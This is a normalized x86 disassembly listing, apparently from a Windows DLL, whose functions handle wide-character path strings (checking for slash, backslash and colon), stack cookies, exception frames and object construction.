mov ecx [ esp + 0x18 ]
xor ecx esp
call sub_10020040
add esp 0x1c
retn 0x1c
mov ecx [ edi ]
mov eax [ esp + 0x10 ]
sub eax ecx
cmp eax ebx
jl r-xdata
add [ esi ] 0x2
add [ edi ] eax
jmp r-xdata
mov ecx [ esp + 0x1c ]
mov edx [ esp + 0x14 ]
mov [ edx ] ecx
push ebx
lea edx [ esp + 0x24 ]
push edx
push eax
push ecx
call sub_1002005a
add [ esi ] 0x2
add esp 0x10
add [ edi ] ebx
mov eax [ esp + 0x38 ]
xor ebp ebp
cmp [ esi ] eax
jne r-xdata
jmp r-xdata
sub_1001dcd0
sub esp 0x10
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0xc ] eax
mov eax [ esp + 0x18 ]
push ebx
mov ebx [ esp + 0x18 ]
push ebp
mov ebp [ esp + 0x24 ]
push esi
push edi
mov edi [ esp + 0x30 ]
add ecx 0x8
push ecx
mov [ edi ] eax
mov edx [ ebx ]
push ebx
lea eax [ esp + 0x1c ]
push 0x0
push eax
mov [ esp + 0x20 ] edx
call sub_1001b60c
mov esi eax
add esp 0x10
test esi esi
jg r-xdata
mov ecx [ edi ]
mov eax ebp
dec esi
sub eax ecx
cmp eax esi
jge r-xdata
pop edi
pop esi
pop ebp
mov eax 0x2
pop ebx
mov ecx [ esp + 0xc ]
xor ecx esp
call sub_10020040
add esp 0x10
retn 0x10
test esi esi
jle r-xdata
mov ecx [ esp + 0x10 ]
pop edi
pop esi
pop ebp
mov [ ebx ] ecx
mov eax 0x1
pop ebx
mov ecx [ esp + 0xc ]
xor ecx esp
call sub_10020040
add esp 0x10
retn 0x10
mov ecx [ esp + 0x1c ]
pop edi
pop esi
pop ebp
pop ebx
xor ecx esp
xor eax eax
call sub_10020040
add esp 0x10
retn 0x10
push esi
lea edx [ esp + 0x18 ]
push edx
push eax
push ecx
call sub_1002005a
add esp 0x10
add [ edi ] esi
sub_1001dd90
push ecx
mov eax [ esp + 0x8 ]
push ebx
push ebp
push esi
mov esi [ esp + 0x18 ]
push edi
mov ebp ecx
mov ecx [ eax ]
xor edi edi
mov [ esp + 0x10 ] ecx
cmp [ esp + 0x24 ] edi
jbe r-xdata
mov eax edi
pop edi
pop esi
pop ebp
pop ebx
pop ecx
retn 0x10
mov ebx [ esp + 0x20 ]
lea edx [ ebp + 0x8 ]
push edx
lea eax [ esp + 0x14 ]
push eax
mov ecx ebx
sub ecx esi
push ecx
lea edx [ esp + 0x24 ]
push esi
push edx
call sub_1001b946
add esp 0x14
cmp eax 0xfffffffe
je r-xdata
cmp eax 0xffffffff
je r-xdata
test eax eax
jne r-xdata
cmp eax 0xfffffffd
jne r-xdata
cmp [ esp + 0x18 ] ax
jne r-xdata
inc edi
add esi eax
cmp edi [ esp + 0x24 ]
jb r-xdata
xor eax eax
mov eax esi
lea edx [ eax + 0x1 ]
jmp r-xdata
cmp esi ebx
je r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
sub_1001de30
cmp [ esp + 0xc ] 0x0
push ebx
push ebp
push esi
push edi
jbe r-xdata
pop edi
pop esi
pop ebp
or eax 0xffffffff
pop ebx
retn 0xc
mov edx [ ecx + 0x14 ]
mov esi [ esp + 0x18 ]
cmp esi edx
jae r-xdata
mov edi [ ecx + 0x18 ]
mov [ esp + 0x18 ] edi
lea ebp [ ecx + 0x4 ]
cmp edi 0x8
jb r-xdata
mov eax ebp
mov eax [ ebp ]
jmp r-xdata
mov eax ebp
mov eax [ ebp ]
jmp r-xdata
lea ebx [ eax + edx * 2 ]
cmp edi 0x8
jb r-xdata
mov edi [ esp + 0x14 ]
lea eax [ eax + esi * 2 ]
cmp eax ebx
jae r-xdata
cmp [ esp + 0x18 ] 0x8
jb r-xdata
add ecx 0x2
sub edx 0x1
jne r-xdata
pop edi
mov ecx ebp
pop esi
sub eax ecx
pop ebp
sar eax 0x1
pop ebx
retn 0xc
mov ecx [ ebp ]
pop edi
pop esi
sub eax ecx
pop ebp
sar eax 0x1
pop ebx
retn 0xc
cmp [ ecx ] si
je r-xdata
add eax 0x2
cmp eax ebx
jb r-xdata
mov edx [ esp + 0x1c ]
movzx esi [ eax ]
mov ecx edi
nop
sub_1001dec0
cmp [ esp + 0xc ] 0x0
push ebx
push ebp
push esi
push edi
mov ebx ecx
jbe r-xdata
pop edi
pop esi
pop ebp
or eax 0xffffffff
pop ebx
retn 0xc
mov eax [ ebx + 0x14 ]
test eax eax
jbe r-xdata
mov ecx [ esp + 0x18 ]
cmp ecx eax
jb r-xdata
mov eax [ ebx + 0x18 ]
mov [ esp + 0x18 ] eax
lea ebp [ ebx + 0x4 ]
cmp eax 0x8
jb r-xdata
lea ecx [ eax - 0x1 ]
mov eax ebp
mov eax [ ebp ]
jmp r-xdata
cmp [ esp + 0x18 ] 0x8
jb r-xdata
add eax 0x2
sub ecx 0x1
jne r-xdata
mov edi [ esp + 0x14 ]
lea esi [ eax + ecx * 2 ]
pop edi
mov eax esi
mov ecx ebp
pop esi
sub eax ecx
pop ebp
sar eax 0x1
pop ebx
retn 0xc
mov ecx [ ebp ]
pop edi
mov eax esi
pop esi
sub eax ecx
pop ebp
sar eax 0x1
pop ebx
retn 0xc
cmp [ eax ] dx
je r-xdata
mov ecx ebx
call sub_10002025
cmp esi eax
je r-xdata
sub esi 0x2
jmp r-xdata
mov ecx [ esp + 0x1c ]
movzx edx [ esi ]
mov eax edi
lea esp [ esp ]
sub_1001df60
push esi
mov esi [ esp + 0x8 ]
mov eax esi
push edi
lea edi [ eax + 0x2 ]
jmp r-xdata
mov dx [ eax ]
add eax 0x2
test dx dx
jne r-xdata
sub eax edi
sar eax 0x1
push eax
mov eax [ esp + 0x14 ]
push eax
push esi
call sub_1001de30
pop edi
pop esi
retn 0x8
sub_1001df90
push ebx
mov ebx [ esp + 0xc ]
push ebp
push esi
mov esi [ esp + 0x10 ]
push edi
mov ebp 0x8
cmp ebx 0x2
jne r-xdata
test ebx ebx
je r-xdata
lea edi [ esi + 0x4 ]
cmp [ esi + 0x18 ] ebp
jb r-xdata
push 0x2
lea eax [ ebx - 0x1 ]
push eax
push r--data
mov ecx esi
call sub_1001dec0
cmp eax 0xffffffff
jne r-xdata
lea edi [ ebx - 0x1 ]
cmp edi [ esi + 0x14 ]
jbe r-xdata
mov eax edi
mov eax [ edi ]
jmp r-xdata
cmp eax 0x1
jne r-xdata
push 0x1
add ebx 0xfffffffe
push ebx
lea ecx [ esp + 0x20 ]
push ecx
mov ecx esi
mov [ esp + 0x24 ] 0x3a
call sub_100093b2
cmp eax 0xffffffff
je r-xdata
cmp [ esi + 0x18 ] ebp
jb r-xdata
call sub_1002059f
cmp [ esi + 0x14 ] 0x1
jae r-xdata
cmp ax 0x5c
jne r-xdata
movzx eax [ eax ]
cmp ax 0x2f
je r-xdata
pop edi
pop esi
pop ebp
inc eax
pop ebx
retn
cmp [ esi + 0x18 ] ebp
jb r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
retn
lea eax [ esi + 0x4 ]
mov eax [ esi + 0x4 ]
jmp r-xdata
cmp [ esi + 0x18 ] ebp
jb r-xdata
call sub_1002059f
add esi 0x4
mov esi [ esi + 0x4 ]
jmp r-xdata
mov eax edi
pop edi
pop esi
pop ebp
pop ebx
retn
cmp ax 0x5c
jne r-xdata
movzx eax [ eax + edi * 2 ]
cmp ax 0x2f
je r-xdata
movzx eax [ edi + 0x2 ]
cmp ax 0x2f
je r-xdata
mov edi [ edi ]
cmp cx 0x5c
je r-xdata
movzx ecx [ esi ]
cmp cx 0x2f
je r-xdata
cmp ax 0x5c
jne r-xdata
sub_1001e090
push ebx
mov ebx [ esp + 0xc ]
push esi
mov esi [ esp + 0xc ]
push edi
cmp ebx 0x2
jbe r-xdata
mov ecx 0x8
cmp [ esi + 0x14 ] 0x1
jae r-xdata
cmp ebx 0x3
jbe r-xdata
lea edi [ esi + 0x4 ]
cmp [ esi + 0x18 ] ecx
jb r-xdata
mov ecx 0x8
lea edi [ esi + 0x4 ]
cmp [ esi + 0x18 ] ecx
jb r-xdata
call sub_1002059f
test ebx ebx
jbe r-xdata
lea edi [ esi + 0x4 ]
cmp [ esi + 0x18 ] ecx
jb r-xdata
mov eax edi
mov eax [ edi ]
jmp r-xdata
mov eax edi
mov eax [ edi ]
jmp r-xdata
or eax 0xffffffff
cmp [ esi + 0x18 ] ecx
jb r-xdata
mov eax edi
mov eax [ edi ]
jmp r-xdata
cmp [ esi + 0x14 ] 0x1
jae r-xdata
cmp ax 0x5c
jne r-xdata
movzx eax [ eax ]
cmp ax 0x2f
je r-xdata
cmp ebx 0x2
jne r-xdata
cmp [ esi + 0x14 ] 0x2
jae r-xdata
cmp [ eax + 0x2 ] 0x3a
jne r-xdata
add esi 0x4
mov esi [ esi + 0x4 ]
jmp r-xdata
cmp [ esi + 0x14 ] 0x1
jae r-xdata
cmp ax 0x5c
jne r-xdata
movzx eax [ eax ]
cmp ax 0x2f
je r-xdata
cmp [ esi + 0x18 ] ecx
jb r-xdata
call sub_1002059f
mov ecx 0x8
cmp [ esi + 0x18 ] ecx
jb r-xdata
call sub_1002059f
mov ecx 0x8
pop edi
pop esi
xor eax eax
pop ebx
retn
cmp ax 0x5c
jne r-xdata
movzx eax [ esi ]
cmp ax 0x2f
je r-xdata
cmp [ esi + 0x18 ] ecx
jb r-xdata
call sub_1002059f
mov ecx 0x8
movzx eax [ edi + 0x2 ]
cmp ax 0x2f
je r-xdata
mov edi [ edi ]
movzx eax [ edi + 0x4 ]
cmp ax 0x2f
je r-xdata
mov edi [ edi ]
movzx eax [ edi + 0x2 ]
cmp ax 0x2f
je r-xdata
mov edi [ edi ]
cmp ax 0x5c
jne r-xdata
pop edi
pop esi
mov eax 0x2
pop ebx
retn
cmp ax 0x5c
jne r-xdata
push 0x2
mov ecx esi
call sub_10006e19
movzx eax [ eax ]
cmp ax 0x2f
je r-xdata
cmp ax 0x5c
jne r-xdata
mov ecx 0x8
cmp ax 0x5c
je r-xdata
push 0x2
push r--data
mov ecx esi
call sub_1001df60
cmp eax ebx
jb r-xdata
pop edi
pop esi
pop ebx
retn
pop edi
pop esi
or eax 0xffffffff
pop ebx
retn
sub_1001e200
sub esp 0x8
mov eax [ ecx ]
mov ecx [ ecx + 0x4 ]
mov edx [ esp + 0x10 ]
neg edx
mov [ esp + 0x4 ] ecx
push edx
lea ecx [ esp + 0x4 ]
mov [ esp + 0x4 ] eax
call sub_1001da40
mov eax [ esp + 0xc ]
mov ecx [ esp ]
mov edx [ esp + 0x4 ]
mov [ eax ] ecx
mov [ eax + 0x4 ] edx
add esp 0x8
retn 0x8
sub_1001e240
sub esp 0x8
push esi
mov esi ecx
mov eax [ esi + 0x14 ]
push edi
push eax
push esi
call sub_1001df90
mov edi eax
mov eax [ esi + 0x14 ]
add esp 0x8
test eax eax
je r-xdata
mov [ esp + 0xb ] 0x0
cmp edi eax
jbe r-xdata
cmp edi 0x1
jne r-xdata
push ebx
push ebp
lea ebx [ edi - 0x1 ]
lea ebp [ edi + edi - 0x2 ]
lea ecx [ ecx ]
cmp [ esi + 0x18 ] 0x8
jb r-xdata
call sub_1002059f
mov eax edi
pop edi
pop esi
add esp 0x8
retn
test ecx ecx
jne r-xdata
pop ebp
pop ebx
cmp ebx [ esi + 0x14 ]
jbe r-xdata
lea eax [ esi + 0x4 ]
mov eax [ esi + 0x4 ]
jmp r-xdata
cmp [ esp + 0xb ] cl
je r-xdata
cmp [ esi + 0x18 ] 0x8
jb r-xdata
call sub_1002059f
mov ecx [ esp + 0x14 ]
mov [ esp + 0xb ] 0x1
jmp r-xdata
cmp ax 0x5c
jne r-xdata
movzx eax [ eax + edi * 2 ]
cmp ax 0x2f
je r-xdata
pop edi
or eax 0xffffffff
pop esi
add esp 0x8
retn
lea eax [ esi + 0x4 ]
mov eax [ esi + 0x4 ]
jmp r-xdata
push edi
push esi
call sub_1001e090
add esp 0x8
mov ecx eax
mov [ esp + 0xc ] ecx
test edi edi
jbe r-xdata
dec edi
sub ebp 0x2
dec ebx
test edi edi
ja r-xdata
cmp ax 0x5c
jne r-xdata
movzx eax [ eax + ebp ]
cmp ax 0x2f
je r-xdata
cmp ebx ecx
je r-xdata
sub_1001e330
push 0xffffffff
push sub_100474e3
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x10 ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ esp + 0xc ] esi
mov [ esi + 0x4 ] 0x1
mov edi [ esp + 0x20 ]
xor edx edx
mov [ esi ] r--data
mov [ esi + 0x8 ] edx
mov eax [ edi + 0xc ]
mov [ esi + 0xc ] eax
mov ecx [ edi + 0x10 ]
mov [ esi + 0x10 ] ecx
mov al [ edi + 0x14 ]
mov [ esi + 0x14 ] al
push 0xffffffff
lea ecx [ esi + 0x18 ]
lea eax [ edi + 0x18 ]
push edx
mov [ ecx + 0x18 ] 0xf
mov [ ecx + 0x14 ] edx
push eax
mov [ esp + 0x24 ] edx
mov [ ecx + 0x4 ] dl
call sub_100021b2
push edi
push esi
mov [ esp + 0x20 ] 0x1
call sub_100386a0
add esp 0x8
mov eax esi
mov ecx [ esp + 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
add esp 0x10
retn 0x4
sub_1001e3d0
push 0xffffffff
push sub_1004754f
mov eax [ fs : 0x0 ]
push eax
sub esp 0x98
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0xa8 ]
mov [ fs : 0x0 ] eax
mov edi [ esp + 0xb8 ]
xor ebx ebx
mov [ esp + 0x10 ] ebx
test edi edi
je r-xdata
mov eax 0x2
mov ecx [ esp + 0xa8 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
add esp 0xa4
retn
cmp [ edi ] ebx
jne r-xdata
push 0x10
call sub_10020186
mov esi eax
add esp 0x4
mov [ esp + 0x14 ] esi
mov [ esp + 0xb0 ] ebx
test esi esi
je r-xdata
xor eax eax
mov ecx [ esp + 0xbc ]
lea eax [ esp + 0x18 ]
push eax
call sub_100076e4
push eax
lea ecx [ esp + 0x38 ]
mov [ esp + 0xb4 ] 0x1
mov [ esp + 0x14 ] 0x1
call sub_1000768f
push 0x0
mov ebx 0x3
push eax
mov ecx esi
mov [ esp + 0xb8 ] 0x2
mov [ esp + 0x18 ] ebx
call sub_1001daa0
jmp r-xdata
test bl 0x1
je r-xdata
and ebx 0xfffffffd
lea ecx [ esp + 0x34 ]
mov [ esp + 0x10 ] ebx
call sub_10007701
mov [ edi ] eax
mov [ esp + 0xb0 ] 0x3
test bl 0x2
je r-xdata
cmp [ esp + 0x30 ] 0x10
jb r-xdata
mov ecx [ esp + 0x1c ]
push ecx
call sub_1002004f
add esp 0x4
sub_1001e4e0
sub esp 0x8
push ebx
mov ebx ecx
mov edx [ ebx + 0x14 ]
push esi
push edi
test edx edx
je r-xdata
pop edi
pop esi
xor eax eax
pop ebx
add esp 0x8
retn
mov ecx [ ebx + 0x18 ]
lea edi [ ebx + 0x4 ]
cmp ecx 0x8
jb r-xdata
mov eax edi
mov eax [ edi ]
jmp r-xdata
call sub_1002059f
cmp ecx 0x8
jb r-xdata
lea esi [ eax + edx * 2 ]
test esi esi
je r-xdata
cmp [ ebp ] 0x3a
pop ebp
je r-xdata
test esi esi
jne r-xdata
mov eax edi
mov eax [ edi ]
jmp r-xdata
mov edx [ ebx + 0x18 ]
cmp edx 0x8
jb r-xdata
cmp [ esi + 0x18 ] 0x8
jb r-xdata
call sub_1002059f
cmp ecx 0x8
jb r-xdata
cmp eax esi
ja r-xdata
mov ecx edi
mov ecx [ edi ]
jmp r-xdata
lea eax [ esi + 0x4 ]
mov eax [ esi + 0x4 ]
jmp r-xdata
mov eax edi
mov eax [ edi ]
jmp r-xdata
call sub_1002059f
cmp edx 0x8
jb r-xdata
mov eax [ ebx + 0x14 ]
add eax eax
lea esi [ eax + ecx ]
test esi esi
je r-xdata
call sub_1002059f
mov ecx [ esi + 0x14 ]
lea edx [ eax + ecx * 2 ]
cmp ebp edx
jb r-xdata
push ebp
push 0xffffffff
lea ecx [ esp + 0x14 ]
mov [ esp + 0x14 ] ebx
mov [ esp + 0x18 ] esi
call sub_1001da40
mov esi [ esp + 0x10 ]
mov ebp [ esp + 0x14 ]
cmp esi 0xfffffffc
je r-xdata
lea eax [ eax + edx * 2 ]
cmp esi eax
jbe r-xdata
movzx eax [ edi ]
cmp ax 0x2f
je r-xdata
test esi esi
jne r-xdata
mov ecx edi
mov ecx [ edi ]
jmp r-xdata
cmp ax 0x5c
je r-xdata
cmp [ esi + 0x18 ] 0x8
jb r-xdata
call sub_1002059f
cmp edx 0x8
jb r-xdata
cmp ecx esi
ja r-xdata
mov esi [ ebx + 0x14 ]
push 0x5c
push 0x1
mov ecx ebx
call sub_10005c07
pop edi
mov eax esi
pop esi
pop ebx
add esp 0x8
retn
lea eax [ esi + 0x4 ]
mov eax [ esi + 0x4 ]
jmp r-xdata
add eax edi
cmp esi eax
jbe r-xdata
mov edi [ edi ]
call sub_1002059f
mov ecx [ esi + 0x14 ]
lea edx [ eax + ecx * 2 ]
cmp edi edx
jb r-xdata
push 0xffffffff
lea ecx [ esp + 0x10 ]
mov [ esp + 0x10 ] ebx
mov [ esp + 0x14 ] esi
call sub_1001da40
mov esi [ esp + 0xc ]
mov edi [ esp + 0x10 ]
cmp esi 0xfffffffc
je r-xdata
sub_1001e640
push 0xffffffff
push sub_1004757b
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x10 ]
mov [ fs : 0x0 ] eax
mov esi ecx
push 0x34
mov [ esp + 0x10 ] 0x0
call sub_10020186
add esp 0x4
mov [ esp + 0xc ] eax
mov [ esp + 0x18 ] 0x0
test eax eax
je r-xdata
xor eax eax
mov ecx [ esp + 0x20 ]
mov edx [ ecx ]
push edx
mov ecx eax
call sub_1001e330
jmp r-xdata
mov eax esi
mov ecx [ esp + 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
add esp 0x10
retn 0x8
cmp [ rw-data ] 0x0
jne r-xdata
mov edi [ esp + 0x24 ]
mov [ esp + 0x18 ] 0xffffffff
mov [ esi ] eax
test edi edi
je r-xdata
mov eax [ rw-data ]
mov ecx [ esi ]
push eax
push edi
push ecx
call sub_10037d36
mov edx [ esi ]
add esp 0xc
mov [ edx + 0x10 ] 0x0
mov ecx [ esi ]
push 0x1
push r--data
add ecx 0x18
call sub_100024af
push 0x0
lea ecx [ esp + 0x24 ]
call sub_1001b1bf
cmp [ rw-data ] 0x0
jne r-xdata
lea ecx [ esp + 0x20 ]
call sub_1001b1e7
mov eax [ rw-data ]
inc eax
mov [ rw-data ] eax
mov [ rw-data ] eax
sub_1001e730
push 0xffffffff
push sub_100475a8
mov eax [ fs : 0x0 ]
push eax
sub esp 0x18
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x28 ]
mov [ fs : 0x0 ] eax
push 0x0
lea ecx [ esp + 0x1c ]
call sub_1001b1bf
cmp [ rw-data ] 0x0
mov ebx [ rw-data ]
mov [ esp + 0x30 ] 0x0
mov [ esp + 0x10 ] ebx
jne r-xdata
mov edi [ esp + 0x38 ]
mov esi [ rw-data ]
mov eax [ edi ]
cmp esi [ eax + 0xc ]
jae r-xdata
push 0x0
lea ecx [ esp + 0x18 ]
call sub_1001b1bf
cmp [ rw-data ] 0x0
jne r-xdata
xor ecx ecx
jmp r-xdata
mov ecx [ eax + 0x8 ]
mov ecx [ ecx + esi * 4 ]
test ecx ecx
jne r-xdata
lea ecx [ esp + 0x14 ]
call sub_1001b1e7
mov eax [ rw-data ]
inc eax
mov [ rw-data ] eax
mov [ rw-data ] eax
cmp [ eax + 0x14 ] 0x0
je r-xdata
mov esi ecx
call sub_1001b2f7
cmp esi [ eax + 0xc ]
jae r-xdata
lea ecx [ esp + 0x18 ]
mov [ esp + 0x30 ] 0xffffffff
call sub_1001b1e7
mov eax esi
mov ecx [ esp + 0x28 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
add esp 0x24
retn
test ebx ebx
je r-xdata
mov edx [ eax + 0x8 ]
mov esi [ edx + esi * 4 ]
jmp r-xdata
lea eax [ esp + 0x10 ]
push edi
push eax
call sub_1001e3d0
add esp 0x8
cmp eax 0xffffffff
jne r-xdata
mov esi ebx
jmp r-xdata
test esi esi
jne r-xdata
mov esi [ esp + 0x10 ]
push 0x0
lea ecx [ esp + 0x3c ]
mov [ rw-data ] esi
call sub_1001b1bf
mov eax [ esi + 0x4 ]
cmp eax 0xffffffff
jae r-xdata
push r--data
lea ecx [ esp + 0x20 ]
call sub_100202ec
push r--data
lea ecx [ esp + 0x20 ]
push ecx
call sub_10023a01
lea ecx [ esp + 0x38 ]
call sub_1001b1e7
push esi
call sub_1001b3bc
add esp 0x4
inc eax
mov [ esi + 0x4 ] eax
sub_1001e880
push 0xffffffff
push sub_1004760c
mov eax [ fs : 0x0 ]
push eax
sub esp 0x48
push ebx
push esi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x54 ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ esp + 0xc ] esi
xor ebx ebx
push ebx
call sub_1001b1bf
mov eax 0xf
mov [ esi + 0x1c ] eax
mov [ esi + 0x18 ] ebx
mov [ esp + 0x5c ] ebx
mov [ esi + 0x8 ] bl
mov [ esi + 0x38 ] eax
mov [ esi + 0x34 ] ebx
mov [ esi + 0x24 ] bl
mov [ esi + 0x54 ] eax
mov [ esi + 0x50 ] ebx
mov [ esi + 0x40 ] bl
mov [ esi + 0x70 ] eax
mov [ esi + 0x6c ] ebx
mov [ esi + 0x5c ] bl
mov ecx [ esp + 0x64 ]
mov [ esp + 0x5c ] 0x4
cmp ecx ebx
jne r-xdata
push ecx
push esi
call sub_1001b563
add esp 0x8
mov eax esi
mov ecx [ esp + 0x54 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
pop ebx
add esp 0x54
retn 0x4
push eax
push r--data
lea ecx [ esp + 0x18 ]
mov [ esp + 0x30 ] eax
mov [ esp + 0x2c ] ebx
mov [ esp + 0x1c ] bl
call sub_100024af
lea eax [ esp + 0x10 ]
push eax
lea ecx [ esp + 0x30 ]
mov [ esp + 0x60 ] 0x5
call sub_10001d6b
push r--data
lea ecx [ esp + 0x30 ]
push ecx
call sub_10023a01
sub_1001e950
push 0xffffffff
push sub_10047646
mov eax [ fs : 0x0 ]
push eax
sub esp 0x7c
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x78 ] eax
push esi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x84 ]
mov [ fs : 0x0 ] eax
mov eax [ esp + 0x94 ]
mov esi ecx
mov [ esp + 0x8 ] esi
mov [ esi + 0x4 ] eax
push r--data
lea ecx [ esp + 0x10 ]
mov [ esp + 0x90 ] 0x0
mov [ esi ] r--data
call sub_1001e880
mov [ esp + 0x8c ] 0x1
call sub_1001b693
lea ecx [ esp + 0xc ]
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] edx
mov [ esp + 0x8c ] 0x0
call sub_10007701
mov eax esi
mov ecx [ esp + 0x84 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov ecx [ esp + 0x78 ]
xor ecx esp
call sub_10020040
add esp 0x88
retn 0x4
sub_1001ea50
push ebx
mov ebx [ esp + 0x8 ]
mov edx [ ebx + 0x14 ]
push ebp
mov ebp ecx
test edx edx
je r-xdata
mov eax ebp
pop ebp
pop ebx
retn 0x4
mov ecx [ ebx + 0x18 ]
push esi
push edi
lea esi [ ebx + 0x4 ]
cmp ecx 0x8
jb r-xdata
mov edi esi
mov edi [ esi ]
jmp r-xdata
call sub_1002059f
cmp ecx 0x8
jb r-xdata
test edi edi
je r-xdata
movzx eax [ edi ]
pop edi
pop esi
cmp ax 0x2f
je r-xdata
cmp [ ebx + 0x18 ] 0x8
jb r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
push 0xffffffff
push 0x0
push ebx
mov ecx ebp
call sub_10006e82
cmp ax 0x5c
je r-xdata
mov ecx [ ebx + 0x14 ]
lea edx [ esi + ecx * 2 ]
cmp edi edx
jb r-xdata
mov esi [ esi ]
cmp ecx 0x8
jb r-xdata
cmp eax edi
ja r-xdata
mov ecx ebp
call sub_1001e4e0
call sub_1002059f
mov eax esi
mov eax [ esi ]
jmp r-xdata
cmp ebx 0xfffffffc
je r-xdata
lea eax [ eax + edx * 2 ]
cmp edi eax
jbe r-xdata
sub_1001eaf0
push 0xffffffff
push sub_10047693
mov eax [ fs : 0x0 ]
push eax
sub esp 0xc
push ebp
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x1c ]
mov [ fs : 0x0 ] eax
mov [ esp + 0x14 ] 0x0
call sub_1001b4c9
mov edi eax
mov [ esp + 0x14 ] edi
call sub_1001b2f7
push 0x0
lea ecx [ esp + 0x14 ]
mov esi eax
call sub_1001b1bf
mov eax [ esi + 0x4 ]
cmp eax 0xffffffff
jae r-xdata
lea ecx [ esp + 0x10 ]
call sub_1001b1e7
push 0x10
mov [ esp + 0x28 ] 0x0
call sub_10020186
mov esi eax
add esp 0x4
mov [ esp + 0x18 ] esi
mov [ esp + 0x24 ] 0x1
test esi esi
je r-xdata
inc eax
mov [ esi + 0x4 ] eax
xor esi esi
push 0x0
mov ecx esi
call sub_1001e950
mov [ esi ] r--data
jmp r-xdata
mov eax ebp
mov ecx [ esp + 0x1c ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebp
add esp 0x18
retn
push 0x0
lea ecx [ esp + 0x30 ]
call sub_1001b1bf
mov eax [ edi + 0x4 ]
test eax eax
jbe r-xdata
mov ebp [ esp + 0x2c ]
push esi
lea eax [ esp + 0x18 ]
push eax
mov ecx ebp
mov [ esp + 0x2c ] 0x0
call sub_1001e640
mov [ esp + 0x24 ] 0xffffffff
test edi edi
je r-xdata
mov esi [ edi + 0x4 ]
neg esi
sbb esi esi
not esi
lea ecx [ esp + 0x2c ]
and esi edi
call sub_1001b1e7
test esi esi
je r-xdata
cmp eax 0xffffffff
jae r-xdata
mov edx [ esi ]
mov eax [ edx ]
push 0x1
mov ecx esi
call eax
dec eax
mov [ edi + 0x4 ] eax
sub_1001ec00
push 0xffffffff
push sub_100476be
mov eax [ fs : 0x0 ]
push eax
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x4 ]
mov [ fs : 0x0 ] eax
mov eax 0x1
test [ rw-data ] al
jne r-xdata
mov eax rw-data
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
pop ecx
add esp 0xc
retn
or [ rw-data ] eax
push rw-data
mov [ esp + 0x10 ] 0x0
call sub_1001eaf0
push sub_1004b460
call sub_10024d30
add esp 0x8
sub_1001ec70
push 0xffffffff
push sub_100476ee
mov eax [ fs : 0x0 ]
push eax
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x4 ]
mov [ fs : 0x0 ] eax
mov eax 0x1
test [ rw-data ] al
jne r-xdata
mov eax rw-data
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
pop ecx
add esp 0xc
retn
or [ rw-data ] eax
mov [ esp + 0xc ] 0x0
call sub_1001ec00
push eax
call sub_1001e730
add esp 0x4
mov [ rw-data ] eax
sub_1001ece0
push 0xffffffff
push sub_10047720
mov eax [ fs : 0x0 ]
push eax
sub esp 0x20
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x2c ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ esp + 0xc ] esi
mov eax 0x7
xor ecx ecx
mov [ esi + 0x18 ] eax
mov [ esi + 0x14 ] 0x0
mov [ esi + 0x4 ] cx
xor edx edx
mov [ esp + 0x14 ] dx
mov edx [ esp + 0x3c ]
mov [ esp + 0x28 ] eax
mov eax edx
mov [ esp + 0x34 ] ecx
mov [ esp + 0x24 ] ecx
lea edi [ eax + 0x2 ]
lea esp [ esp ]
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax edi
sar eax 0x1
push eax
push edx
lea ecx [ esp + 0x18 ]
call sub_1000155d
mov [ esp + 0x34 ] 0x1
call sub_1001ec70
mov eax [ eax ]
push eax
lea eax [ esp + 0x14 ]
push esi
push eax
call sub_1000cd18
add esp 0xc
cmp [ esp + 0x28 ] 0x8
jb r-xdata
mov eax esi
mov ecx [ esp + 0x2c ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
add esp 0x2c
retn 0x8
mov ecx [ esp + 0x14 ]
push ecx
call sub_1002004f
add esp 0x4
sub_1001eda0
push 0xffffffff
push sub_10047750
mov eax [ fs : 0x0 ]
push eax
sub esp 0x24
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x20 ] eax
push esi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x2c ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov ecx [ esp + 0x3c ]
xor edx edx
xor eax eax
mov [ esi + 0x18 ] 0x7
mov [ esi + 0x14 ] edx
mov [ esp + 0x8 ] esi
mov [ esi + 0x4 ] ax
mov eax [ esp + 0x40 ]
mov [ esp + 0x34 ] edx
cmp ecx eax
je r-xdata
mov eax esi
mov ecx [ esp + 0x2c ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov ecx [ esp + 0x20 ]
xor ecx esp
call sub_10020040
